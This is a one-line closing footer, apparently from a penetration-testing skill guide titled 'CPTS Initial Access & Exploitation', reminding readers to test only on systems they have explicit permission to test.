*End of CPTS Initial Access & Exploitation skill. Always test only on systems you have explicit permission to test.*
